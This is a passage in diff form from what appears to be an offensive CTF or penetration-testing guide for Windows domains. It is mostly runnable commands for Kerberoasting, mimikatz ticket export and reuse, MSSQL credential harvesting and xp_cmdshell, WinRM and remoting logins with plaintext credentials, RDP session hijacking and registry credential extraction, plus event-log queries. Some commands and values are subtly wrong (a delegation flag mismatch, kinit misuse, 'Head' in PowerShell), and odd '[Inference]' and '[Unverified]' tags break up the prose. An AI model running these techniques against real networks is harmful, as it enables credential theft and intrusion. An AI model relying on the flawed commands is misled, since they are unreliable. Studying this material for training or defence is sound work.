+$Credential = New-Object System.Management.Automation.PSCredential("domain\user", (ConvertTo-SecureString "password" -AsPlainText -Force))
+[System.IdentityModel.Tokens.KerberosRequestorSecurityToken]::Bind($Credential)
+klist
+```
+
+Export tickets for external processing with `mimikatz`:
+
+```
+kerberos::list /export
+```
+
+Kerberoasting attacks target service accounts running under non-machine accounts [Inference] where the service ticket encryption uses the service account password rather than machine account credentials, enabling offline brute-force against typically weaker service account passwords, though successful exploitation requires either existing domain credentials or pre-authentication bypasses.
+
+**Delegation Analysis**
+
+Identify Kerberos delegation configurations:
+
+```bash
+ldapsearch -H ldap://<target-dc> -x "(&(objectClass=user)(|(msDS-AllowedToDelegateTo=*)(userAccountControl:1.2.840.113556.1.4.803:=1048576))))" msDS-AllowedToDelegateTo sAMAccountName
+```
+
+Query delegation flags using LDAP:
+
+```bash
+enum4linux -U <target-dc>
+```
+
+Unconstrained delegation (UserAccountControl flag 0x80000) permits [Inference] use of TGTs for accessing any service as the delegated account, enabling privilege escalation through TGT theft and reuse, though specific exploitation depends on compromising systems with unconstrained delegation configured.
+
+Constrained delegation (msDS-AllowedToDelegateTo) restricts delegation to specific services, reducing [Inference] but not eliminating exploitation surface through protocol transition attacks (S4U2Proxy), though actual attack feasibility depends on specific delegation configuration and Kerberos protocol version support.
+
+**Ticket-Granting Ticket (TGT) Theft and Reuse**
+
+Extract TGTs from compromised systems:
+
+```bash
+mimikatz # kerberos::list
+mimikatz # kerberos::ptc <ticket_file>
+```
+
+Base64-encoded tickets extracted via `klist /export`:
+
+```bash
+echo "base64_ticket_data" | base64 -d > ticket.kirbi
+```
+
+Import tickets for use against domain resources:
+
+```bash
+kinit -c /tmp/ccache_file --keytab=ticket.ccache
+export KRB5CCNAME=/tmp/ccache_file
+```
+
+TGT reuse enables [Inference] lateral movement and privilege escalation under the compromised user's identity, though TGT validity depends on ticket expiration (typically 10 hours) and server clock synchronization [Unverified] regarding specific Kerberos implementation tolerance for temporal deviations.
+
+**Resource-Based Constrained Delegation (RBCD)**
+
+Enumerate RBCD configurations:
+
+```bash
+ldapsearch -H ldap://<target-dc> -x "(&(objectClass=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" msDS-AllowedToActOnBehalfOfOtherIdentity sAMAccountName
+```
+
+RBCD allows [Inference] computers to act on behalf of other identities when performing S4U2Proxy delegation, enabling privilege escalation from any computer account (frequently compromised through machine compromise or Responder-based captures) to domain administrators or service accounts, though specific exploitation requires S4U2Proxy-capable Kerberos implementations.
+
+**Kerberos Encryption Downgrade Analysis**
+
+Identify weaker encryption algorithms in use:
+
+```bash
+grep -r "encryptionType\|krbtgt\|RC4" /mnt/sysvol --include="*.xml" -i
+```
+
+Systems supporting legacy encryption (DES, RC4) enable [Inference] reduced-complexity offline cracking of captured Kerberos tickets, though modern Windows defaults use AES-256-CTS-HMAC-SHA1-96 making legacy attacks increasingly uncommon on updated systems.
+
+---
+
+## MSSQL Enumeration
+
+MSSQL enumeration identifies database instances, discovers databases and tables, extracts credentials from database objects, and maps database privileges for lateral movement and data exfiltration.
+
+**MSSQL Service Discovery**
+
+Identify SQL Server instances on the network:
+
+```bash
+nmap -sU -p 1434 <target>
+nmap -sV -p 1433,1434,3306,5432 <target>
+nmap -sV --script mssql-info <target>
+nmap -sV --script mssql-enum-accounts <target>
+```
+
+SQL Server typically listens on TCP port 1433 (default named instance) and UDP port 1434 (SQL Server Browser). The `-sU` flag performs UDP scanning; UDP port 1434 responses reveal [Inference] instance names, versions, and clustering information when SQL Server Browser service is enabled, though this service is frequently disabled on hardened systems.
+
+**SQL Server Authentication Testing**
+
+Attempt connection with default and weak credentials:
+
+```bash
+sqsh -S <target> -U sa -P ""
+sqsh -S <target> -U sa -P "password"
+impacket-mssqlclient <target>/sa:password@<target>
+impacket-mssqlclient -windows-auth <target>/domain\\user:password@<target>
+```
+
+The `sqsh` command-line client connects interactively; Impacket's `mssqlclient` provides [Inference] enhanced reconnaissance capabilities including database enumeration and extended stored procedure execution when authentication succeeds.
+
+Connection string format:
+
+```
+host:port\InstanceName
+```
+
+Multiple instances on single servers use port ranges or named pipes for communication [Unverified] though most enumeration tools default to instance port 1433 and require explicit specification for non-default configurations.
+
+**Database and Table Enumeration**
+
+Query database structure after authentication:
+
+```sql
+SELECT name FROM sys.databases;
+SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
+SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA != 'dbo';
+```
+
+From command line:
+
+```bash
+impacket-mssqlclient -windows-auth domain\\user:password@<target> -query "SELECT name FROM sys.databases;"
+```
+
+Identify application-specific databases (non-system), custom tables, and potentially sensitive data storage [Inference] indicating high-value targets for credential or data extraction, though specific sensitivity depends on application purpose and data classification.
+
+**Credential Harvesting from Database Objects**
+
+Search for stored procedures, views, and triggers containing credentials:
+
+```sql
+SELECT ROUTINE_NAME, ROUTINE_DEFINITION FROM INFORMATION_SCHEMA.ROUTINES WHERE ROUTINE_DEFINITION LIKE '%password%';
+SELECT OBJECT_NAME, DEFINITION FROM sys.sql_modules WHERE DEFINITION LIKE '%password%';
+EXEC sp_helpdb;
+```
+
+Examine user tables for credential patterns:
+
+```sql
+SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES 
+WHERE TABLE_NAME LIKE '%user%' OR TABLE_NAME LIKE '%account%' OR TABLE_NAME LIKE '%credential%';
+SELECT * FROM users;
+SELECT * FROM credentials;
+```
+
+[Unverified] Database objects frequently contain application credentials, API keys, or service account passwords embedded in connection strings or stored procedures, though credential storage practices vary significantly by application design.
+
+**Linked Server Enumeration**
+
+Discover inter-database connections:
+
+```sql
+EXEC sp_linkedservers;
+SELECT * FROM sys.servers;
+EXEC sp_helpserver;
+```
+
+Linked servers enable [Inference] lateral movement to other database instances or systems when configured with stored credentials, allowing pivoting from compromised SQL Server instances to interconnected infrastructure, though actual exploitation depends on linked server authentication method and target system accessibility.
+
+**SQL Server Agent Jobs Analysis**
+
+Examine scheduled jobs for credential exposure:
+
+```sql
+USE msdb;
+SELECT * FROM sysjobs;
+SELECT * FROM sysjobsteps;
+SELECT job_id, step_id, command FROM sysjobsteps WHERE command LIKE '%password%';
+```
+
+Job steps may contain [Inference] hardcoded credentials, service account credentials, or commands executing with elevated privileges (job owner privileges), though credential visibility depends on specific job implementation and permissions.
+
+**Extended Stored Procedures and CLR Integration**
+
+Identify dangerous extension capabilities:
+
+```sql
+SELECT * FROM sys.objects WHERE type = 'X';
+SELECT name FROM sys.assemblies WHERE permission_set_id != 1;
+SELECT * FROM sys.assembly_files;
+```
+
+Extended stored procedures (type 'X') enable [Inference] operating system command execution under SQL Server service account privileges when enabled, potentially allowing arbitrary code execution on the database server, though xp_cmdshell is disabled by default on modern installations due to security concerns.
+
+Enable and use xp_cmdshell [Unverified] when configuration permits:
+
+```sql
+EXEC xp_cmdshell 'ipconfig';
+EXEC xp_cmdshell 'whoami';
+```
+
+[Inference] CLR assemblies compiled to intermediate language (IL) may execute arbitrary code when registered in SQL Server, though CLR integration requires explicit enablement and administrative privileges for assembly registration.
+
+**SQL Server Service Account Identification**
+
+Determine SQL Server execution context:
+
+```sql
+SELECT SUSER_NAME();
+EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER', 'ObjectName';
+```
+
+From command line using `impacket-mssqlclient`:
+
+```bash
+impacket-mssqlclient -windows-auth domain\\user:password@<target> -query "SELECT SUSER_NAME();"
+```
+
+Service account privileges determine [Inference] potential impact of SQL Server compromise—service accounts running as LocalSystem or domain administrators enable privileged operations across the network, while service accounts running as NETWORKSERVICE or local service accounts limit exploitability to the database server itself.
+
+**SQL Server Port Scanning Optimization**
+
+Comprehensive database server reconnaissance:
+
+```bash
+nmap -sV -p 1433,1434 --script mssql-* <target>
+nmap -sV -p 1433 --script mssql-empty-password <target>
+nmap -sV -p 1433 --script mssql-info,mssql-enum-accounts,mssql-query <target>
+```
+
+The `mssql-empty-password` script tests sa (system administrator) account with empty password—a [Unverified] common misconfiguration on development/test instances though rarely present on production systems with proper hardening.
+
+**Database Privilege Escalation**
+
+Identify database roles and permissions:
+
+```sql
+SELECT * FROM sys.database_principals WHERE type = 'R';
+EXEC sp_helprole;
+SELECT name, sid FROM sys.database_principals WHERE type = 'R';
+SELECT DB_NAME(database_id), * FROM sys.database_permissions;
+```
+
+Database roles with administrative privileges (db_owner, db_securityadmin) enable [Inference] credential modification, user creation, or privilege escalation within database scope, though domain-level privilege escalation requires additional exploitation vectors beyond database permissions.
+
+---
+
+## WinRM Enumeration
+
+Windows Remote Management (WinRM) provides remote command execution capabilities and represents a significant attack surface when improperly configured or when default credentials persist.
+
+**WinRM Service Status Detection**
+
+Verify WinRM availability and listening status:
+
+```powershell
+Get-Service WinRM | Select-Object Status, StartType
+Test-WSMan
+Test-WSMan -ComputerName target_host
+```
+
+The `Test-WSMan` cmdlet validates HTTP/HTTPS connectivity to the WinRM service (default ports 5985 for HTTP, 5986 for HTTPS).
+
+**Port and Listener Enumeration**
+
+```powershell
+Get-WSManInstance winrm/config/listener
+Get-WSManInstance winrm/config/listener -SelectorSet @{Address="*";Transport="HTTP"}
+Get-WSManInstance winrm/config/listener -SelectorSet @{Address="*";Transport="HTTPS"}
+```
+
+Examine listener bindings to identify accessible protocols and authentication methods:
+
+```powershell
+winrm enumerate winrm/config/listener
+winrm get winrm/config
+```
+
+**Authentication Method Detection**
+
+```powershell
+Get-WSManInstance winrm/config | Select-Object -ExpandProperty auth
+(Get-WSManInstance winrm/config).auth
+```
+
+Output displays enabled authentication mechanisms (Basic, Kerberos, Negotiate, Digest, CredSSP). Basic authentication over HTTP represents highest risk.
+
+```powershell
+# Detailed authentication configuration
+winrm get winrm/config | findstr /I "auth"
+```
+
+**Credential Delegation Analysis**
+
+CredSSP delegation enables credential passing to remote systems:
+
+```powershell
+Get-WSManInstance winrm/config/service | Select-Object -ExpandProperty auth
+Get-Item -Path WSMan:\localhost\Service\Auth\CredSSP
+```
+
+If CredSSP is enabled without restrictions, credentials may be exposed through relay attacks or credential harvesting.
+
+**AllowUnencrypted Traffic Detection**
+
+```powershell
+Get-Item -Path WSMan:\localhost\Service\AllowUnencrypted
+Get-Item -Path WSMan:\localhost\Client\AllowUnencrypted
+```
+
+Value of `true` indicates unencrypted WinRM traffic, exposing credentials in transit.
+
+**Remote Access Permissions**
+
+Identify which users/groups possess WinRM execution rights:
+
+```powershell
+Get-PSSessionConfiguration
+Get-PSSessionConfiguration | Select-Object Name, Permission
+icacls "\\?\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WSMAN"
+```
+
+Examine session configuration descriptors for restricted access:
+
+```powershell
+Get-PSSessionConfiguration -Name Microsoft.PowerShell | Select-Object @{Name="RunAs";Expression={$_.RunAsUser}}
+```
+
+**WinRM Discovery via Network Enumeration**
+
+From external position, enumerate WinRM availability:
+
+```bash
+# From Linux attacking Windows target
+nmap -p 5985,5986 target_host
+nmap -p 5985,5986 --script=winrm-identify target_host
+curl -k https://target_host:5986/wsman
+```
+
+**WinRM Connection Exploitation**
+
+Establish remote session when credentials are available:
+
+```powershell
+$credential = New-Object System.Management.Automation.PSCredential("domain\username", (ConvertTo-SecureString "password" -AsPlainText -Force))
+$session = New-PSSession -ComputerName target_host -Credential $credential -Authentication Negotiate
+Enter-PSSession $session
+```
+
+Execute commands without interactive session:
+
+```powershell
+Invoke-Command -ComputerName target_host -Credential $credential -ScriptBlock { whoami; Get-Content C:\flag.txt }
+```
+
+**WinRM over HTTPS with Self-Signed Certificates**
+
+Bypass certificate validation when connecting to systems with self-signed certificates:
+
+```powershell
+$credential = New-Object System.Management.Automation.PSCredential("domain\username", (ConvertTo-SecureString "password" -AsPlainText -Force))
+$sessionOption = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$session = New-PSSession -ComputerName target_host -Credential $credential -UseSSL -SessionOption $sessionOption
+```
+
+**Default WinRM Configuration Paths**
+
+Configuration files for enumeration:
+
+```powershell
+Get-Content $env:windir\System32\wsman\config\winrm.config.d\*.xml
+Get-Content $env:windir\System32\wsman\config\winrm.config
+```
+
+## RDP Enumeration
+
+Remote Desktop Protocol (RDP) provides graphical remote access and frequently appears in CTF scenarios and post-exploitation workflows. Misconfigurations expose systems to credential stuffing, protocol exploitation, and session hijacking.
+
+**RDP Service Status and Port Detection**
+
+Verify RDP service availability:
+
+```powershell
+Get-Service TermService | Select-Object Status, StartType
+netstat -ano | findstr :3389
+Get-NetTCPConnection -LocalPort 3389
+```
+
+RDP defaults to TCP port 3389 but may be configured on alternative ports. Enumerate listening ports:
+
+```powershell
+Get-NetTCPConnection -State Listen | Where-Object {$_.LocalPort -gt 3000}
+```
+
+**RDP Configuration Analysis**
+
+Access RDP settings via Group Policy and registry:
+
+```powershell
+gpresult /h report.html
+# Then search for RDP-related policies within the generated report
+```
+
+Direct registry interrogation:
+
+```powershell
+Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" | Select-Object fDenyTSConnections
+Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" | Select-Object SecurityLayer, MinEncryptionLevel
+```
+
+Key registry values:
+
+- `fDenyTSConnections`: 0 = RDP enabled, 1 = RDP disabled
+- `SecurityLayer`: 0 = RDP, 1 = Negotiate, 2 = SSL/TLS
+- `MinEncryptionLevel`: 1 = Low, 2 = Client-Compatible, 3 = High, 4 = FIPS
+
+**Authentication Requirement Detection**
+
+```powershell
+Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" | Select-Object UserAuthentication
+```
+
+Value of 0 indicates NLA (Network Level Authentication) disabled, allowing connection attempts before credential submission.
+
+**RDP Security Policy Enumeration**
+
+```powershell
+Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows NT\Terminal Services" | Select-Object *
+Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" | Select-Object SecurityLayer, MinEncryptionLevel, EncryptionLevel
+```
+
+**RDP Session Enumeration**
+
+List active RDP sessions:
+
+```powershell
+query session
+query user
+quser
+Get-NetTCPConnection -State Established -LocalPort 3389
+```
+
+Obtain detailed session information:
+
+```powershell
+Get-Process -IncludeUserName | Where-Object {$_.ProcessName -eq "svchost"} | Select-Object UserName
+```
+
+**RDP Certificate Detection**
+
+RDP uses self-signed certificates by default. Export and analyze:
+
+```powershell
+# Enumerate RDP certificate thumbprint
+Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" | Select-Object SSLCertificateSHA1Hash
+
+# Export certificate details
+mmc.exe /snap:certlm.msc
+# Navigate to: Personal > Certificates > RDP certificate
+```
+
+Certificate information can identify certificate validity, expiration, and potential spoofing attacks.
+
+**Network-Based RDP Enumeration**
+
+From external attack platform:
+
+```bash
+# Port scanning
+nmap -p 3389 target_host
+nmap -p 3389 --script rdp-enum-encryption target_host
+
+# Banner grabbing
+nmap -p 3389 --script rdp-ntlm-info target_host
+
+# Using Metasploit
+msfconsole
+use auxiliary/scanner/rdp/rdp_scanner
+set RHOSTS target_host
+run
+```
+
+Gather RDP version and capabilities:
+
+```bash
+python3 rdpy-scanner.py target_host 3389
+```
+
+**RDP Credential Harvesting via Downgrade**
+
+[Unverified] RDP supports multiple encryption levels. Systems configured for compatibility may accept downgraded connections. Test encryption negotiation:
+
+```bash
+# Using mstsc from Windows
+mstsc /v:target_host /admin
+
+# From Linux, using xfreerdp
+xfreerdp /v:target_host /u:username /p:password +credentials-guard
+```
+
+**RDP Session Hijacking**
+
+If local administrator access exists, assume RDP sessions of other users:
+
+```powershell
+query session
+# Identify target session ID
+tscon 1 /dest:console
+# Or
+mstsc.exe /v:target_host /admin
+```
+
+[Inference] Session hijacking requires local administrative privileges and depends on session state accessibility.
+
+**RDP Gateway Enumeration**
+
+Identify RDP Gateway servers enabling external access:
+
+```powershell
+Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows NT\Terminal Services\RPC" | Select-Object *
+netsh advfirewall firewall show rule name="*RDP*"
+```
+
+Check for RDP Gateway configuration:
+
+```powershell
+Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved" | Select-Object "*RDP*"
+```
+
+## Windows Registry Analysis
+
+The Windows Registry contains system configuration, user credentials, application settings, and historical activity data essential for privilege escalation and lateral movement.
+
+**Registry Structure Overview**
+
+Primary registry hives:
+
+- `HKEY_LOCAL_MACHINE (HKLM)`: System-wide settings
+- `HKEY_CURRENT_USER (HKCU)`: Active user settings
+- `HKEY_USERS`: All user profiles
+- `HKEY_CLASSES_ROOT`: File associations and COM classes
+- `HKEY_CURRENT_CONFIG`: Hardware profile settings
+
+**Registry Hive File Locations**
+
+Physical hive files on disk:
+
+```powershell
+Get-Item -Path "C:\Windows\System32\config\*" | Select-Object Name, LastWriteTime
+```
+
+User-specific hives:
+
+```powershell
+Get-Item -Path "C:\Users\*\NTUSER.DAT" -Force | Select-Object FullName, LastWriteTime
+```
+
+**Credentials and Authentication Data**
+
+Extract cached credentials:
+
+```powershell
+Get-ItemProperty -Path "HKLM:\SECURITY\Policy\Secrets" -ErrorAction SilentlyContinue
+Get-ItemProperty -Path "HKLM:\SAM\SAM\Domains\Account\Users" | Select-Object PSChildName
+```
+
+[Unverified] Direct access to SAM hive requires `SYSTEM` privileges. Offline registry analysis may be required for credential extraction.
+
+**Stored RDP Credentials**
+
+```powershell
+Get-ItemProperty -Path "HKCU:\Software\Microsoft\Remote Desktop Connection Manager\Default.rdg"
+Get-ChildItem -Path "HKCU:\Software\Microsoft\Internet Explorer\IntelliForms\Storage2" -Recurse
+```
+
+Browser autofill credentials:
+
+```powershell
+Get-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\IntelliForms\Storage2"
+```
+
+**Autologon Credentials**
+
+Systems configured for automatic logon store credentials in plaintext:
+
+```powershell
+Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object DefaultUserName, DefaultPassword, DefaultDomainName
+```
+
+**PowerShell Command History in Registry**
+
+```powershell
+Get-ItemProperty -Path "HKCU:\Software\Microsoft\PowerShell\1\PSReadline\ConsoleHost_history.txt"
+Get-Content -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+```
+
+**Run and RunOnce Keys (Persistence Indicators)**
+
+```powershell
+Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
+Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+```
+
+Examine all users' Run keys:
+
+```powershell
+foreach($user in Get-ChildItem "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\ProfileList") {
+    $path = $user.PSPath -replace "HKEY_LOCAL_MACHINE", "Registry::HKLM"
+    Get-ItemProperty -Path "$path\Software\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue
+}
+```
+
+**Shell Extension Hijacking Vectors**
+
+```powershell
+Get-ItemProperty -Path "HKLM:\SOFTWARE\Classes\*\ShellEx\ContextMenuHandlers"
+Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2"
+```
+
+**AppInit DLLs (Code Injection Point)**
+
+```powershell
+Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" | Select-Object AppInit_DLLs, LoadAppInit_DLLs
+```
+
+If `LoadAppInit_DLLs` is 1 and `AppInit_DLLs` contains paths, those DLLs load into all processes using User32.dll.
+
+**Service Configuration Analysis**
+
+```powershell
+Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\*" | Select-Object PSChildName, ImagePath, Start, Type
+```
+
+Identify services with suspicious or world-writable binaries:
+
+```powershell
+Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\*" | Where-Object {$_.ImagePath -like "*C:\Temp\*" -or $_.ImagePath -like "*%temp%\*"}
+```
+
+**Network Configuration and Credentials**
+
+VPN and network settings:
+
+```powershell
+Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\RAS\Connections\*"
+Get-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Settings\ZoneMap"
+```
+
+Proxy configuration that might expose credentials:
+
+```powershell
+Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" | Select-Object ProxyServer, ProxyEnable
+```
+
+**Scheduled Tasks Registry Entries**
+
+```powershell
+Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\*"
+```
+
+**Registry Parsing and Extraction (Offline)**
+
+For systems where Registry access is restricted, extract hives offline:
+
+```bash
+# From Linux, using python-registry module
+python3 -c "
+from Registry import Registry
+reg = Registry.Registry('/path/to/SYSTEM')
+for subkey in reg.root.subkeys():
+    print(subkey.name)
+"
+```
+
+Or using RegRipper:
+
+```bash
+regrip.pl -r SYSTEM -p rip_plugin_name
+```
+
+**Registry Privilege Escalation Patterns**
+
+Identify potentially exploitable registry configurations:
+
+```powershell
+# World-writable registry keys
+Get-ItemProperty -Path "HKLM:\SOFTWARE\*" | Where-Object {$_ -match ".*\\.*"}
+
+# Unquoted service paths
+Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\*" | Where-Object {$_.ImagePath -notlike "`"*"} | Select-Object PSChildName, ImagePath
+```
+
+## PowerShell Remoting Discovery
+
+PowerShell Remoting enables execution of scripts and commands across networked systems and represents a critical attack surface for lateral movement and privilege escalation when poorly configured.
+
+**PowerShell Remoting Service Status**
+
+Verify Windows Remote Management (WinRM) enablement:
+
+```powershell
+Get-Service WinRM | Select-Object Status, StartType
+Test-WSMan -ComputerName localhost
+```
+
+**PowerShell Session Configuration Enumeration**
+
+List all available PowerShell session configurations:
+
+```powershell
+Get-PSSessionConfiguration
+Get-PSSessionConfiguration | Select-Object Name, Permission, RunAsUser
+```
+
+Detailed configuration analysis:
+
+```powershell
+Get-PSSessionConfiguration -Name Microsoft.PowerShell | Select-Object *
+Get-PSSessionConfiguration Microsoft.PowerShell | Format-List -Property *
+```
+
+**Session Configuration Security Descriptor Analysis**
+
+Extract and decode security descriptors:
+
+```powershell
+$config = Get-PSSessionConfiguration -Name Microsoft.PowerShell
+$descriptor = $config | Select-Object -ExpandProperty SecurityDescriptorSDDL
+$descriptor
+```
+
+[Inference] SDDL format encoding requires manual decoding or conversion tools to identify permission assignments.
+
+**Credential Delegation Analysis**
+
+```powershell
+Get-PSSessionConfiguration | Select-Object Name, RunAsUser, @{Name="DelegateToIdentity";Expression={$_.RunAsUser}}
+```
+
+Identify if PowerShell remoting delegates credentials or restricts user identity.
+
+**PowerShell Execution Policy**
+
+Check execution policy restrictions:
+
+```powershell
+Get-ExecutionPolicy -Scope CurrentUser
+Get-ExecutionPolicy -Scope LocalMachine
+Get-ExecutionPolicy -List
+```
+
+Execution policy scope hierarchy (highest to lowest):
+
+1. Process
+2. CurrentUser
+3. LocalMachine
+4. MachinePolicy / UserPolicy
+
+**PSRemoting Trust Settings**
+
+Identify trusted hosts for remote connections:
+
+```powershell
+Get-Item WSMan:\localhost\Client\TrustedHosts
+```
+
+If set to `*`, any host can connect. If specific hosts listed, credentials may be transmitted insecurely.
+
+**PowerShell Remoting Protocol Versions**
+
+```powershell
+$PSVersionTable
+Get-PSSession | Select-Object Version
+```
+
+Older PowerShell versions (2.0) lack security enhancements in later versions.
+
+**Authentication Mechanism Detection**
+
+```powershell
+Get-WSManInstance winrm/config/service/auth
+(Get-WSManInstance winrm/config).auth
+```
+
+Supported authentication types: Kerberos, Negotiate, Basic, Digest, CredSSP, Certificate.
+
+**Remote Command Execution Discovery**
+
+Enumerate accessible remote systems:
+
+```powershell
+# Test connectivity to target systems
+Test-WSMan -ComputerName target_host1, target_host2
+
+# List accessible sessions
+Get-PSSession
+Get-PSSession -ComputerName target_host
+```
+
+**PowerShell Remoting Connection Exploitation**
+
+Establish remote session when credentials available:
+
+```powershell
+$credential = New-Object System.Management.Automation.PSCredential("domain\username", (ConvertTo-SecureString "password" -AsPlainText -Force))
+$session = New-PSSession -ComputerName target_host -Credential $credential
+Enter-PSSession $session
+```
+
+Execute commands without interactive session:
+
+```powershell
+$sb = {Get-Content C:\flag.txt; whoami}
+Invoke-Command -ComputerName target_host -Credential $credential -ScriptBlock $sb
+```
+
+**PowerShell ConstrainedLanguage Mode Detection**
+
+[Unverified] Constrained Language Mode restricts PowerShell capabilities. Enumerate restrictions:
+
+```powershell
+$ExecutionContext.SessionState.LanguageMode
+```
+
+Output values: FullLanguage, ConstrainedLanguage, RestrictedLanguage, NoLanguage.
+
+If ConstrainedLanguage enabled, script execution capabilities are restricted, requiring bypass techniques.
+
+**PowerShell Logging Configuration**
+
+```powershell
+Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"
+Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
+Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
+```
+
+Identify if PowerShell logging is enabled, which may record executed commands and ScriptBlock contents.
+
+**PowerShell Profile Analysis**
+
+User and system PowerShell profiles execute automatically:
+
+```powershell
+$PROFILE
+$PROFILE.AllUsersAllHosts
+$PROFILE.AllUsersCurrentHost
+$PROFILE.CurrentUserAllHosts
+$PROFILE.CurrentUserCurrentHost
+```
+
+Display profile contents:
+
+```powershell
+Get-Content $PROFILE -ErrorAction SilentlyContinue
+Get-Content $env:windir\System32\WindowsPowerShell\v1.0\profile.ps1 -ErrorAction SilentlyContinue
+```
+
+**PowerShell History Extraction**
+
+```powershell
+Get-Content -Path (Get-PSReadlineOption).HistorySavePath
+Get-Content -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
+```
+
+## Windows Event Log Analysis
+
+Windows Event Logs record system, security, and application events, providing forensic evidence of user activity, privilege escalation attempts, and lateral movement pathways.
+
+**Event Log Architecture**
+
+Primary event log channels:
+
+- **System**: Operating system and hardware events, driver failures, startup/shutdown
+- **Security**: Authentication, privilege usage, object access, policy changes
+- **Application**: Software-specific events
+- **Setup**: Windows installation and component updates
+- **Forwarded Events**: Events from remote computers
+
+Access via Event Viewer:
+
+```powershell
+eventvwr.msc
+```
+
+**PowerShell Event Log Query**
+
+Query Security log for specific event IDs:
+
+```powershell
+Get-EventLog -LogName Security | Select-Object EventID, TimeGenerated, Message | Head -100
+Get-WinEvent -LogName Security | Select-Object ID, TimeCreated, Message | Head -100
+```
+
+**Event ID Reference for Exploitation**
+
+Critical security event IDs:
+
+- **4624**: Successful logon (includes logon type: 2=Interactive, 3=Network, 10=RemoteInteractive)
+- **4625**: Failed logon (credential guessing indicator)
+- **4720**: User account created
+- **4728**: User added to security-enabled global group
+- **4732**: User added to security-enabled local group
+- **4738**: User account modified
+- **4768**: Kerberos TGT requested
+- **4769**: Kerberos service ticket requested
+- **4776**: NTLM authentication attempt
+- **4799**: Security group enumeration detected
+- **5140**: Network share accessed
+- **5145**: Network share object checked for access permission
+
+**Credential Compromise Detection**
+
+Query for failed logons indicating credential stuffing:
+
+```powershell
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} -MaxEvents 1000 | Where-Object {$_.TimeCreated -gt (Get-Date).AddDays(-1)} | Select-Object TimeCreated, @{Name="Account";Expression={$_.Properties[5].Value}}, @{Name="Workstation";Expression={$_.Properties[13].Value}}
+```
+
+Successful logons from unusual sources:
+
+```powershell
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} | Where-Object {$_.Properties[8].Value -like "*CORP*"} | Select-Object TimeCreated, @{Name="User";Expression={$_.Properties[5].Value}}, @{Name="LogonType";Expression={$_.Properties[8].Value}}
+```
+
+**Lateral Movement Indicators**
+
+Network logons (Event ID 4624, LogonType 3):
+
+```powershell
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624; Data=3} | Select-Object TimeCreated, @{Name="User";Expression={$_.Properties[5].Value}}, @{Name="Computer";Expression={$_.Properties[11].Value}}
+```
+
+Remote Interactive logons (Event ID 4624, LogonType 10 - RDP):
+
+```powershell
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} | Where-Object {$_.Properties[8].Value -eq 10} | Select-Object TimeCreated, @{Name="User";Expression={$_.Properties[5].Value}}
+```
+
+**Privilege Escalation Evidence**
+
+Special Privileges Assigned event (Event ID 4672):
+
+```powershell
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4672} | Select-Object TimeCreated, @{Name="User";Expression={$_.Properties[1].Value}}, @{Name="Privileges";Expression={$_.Properties[2].Value}}
+```
+
+Token elevation type analysis:
+
+```powershell
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} | Where-Object {$_.Properties[8].Value -in @(2,10,11)} | Select-Object TimeCreated, @{Name="ElevationType";Expression={$_.Properties[8].Value}}
+```
+
+**Administrative Action Logging**
+
+Local group modification (Event ID 4732):
+
+```powershell
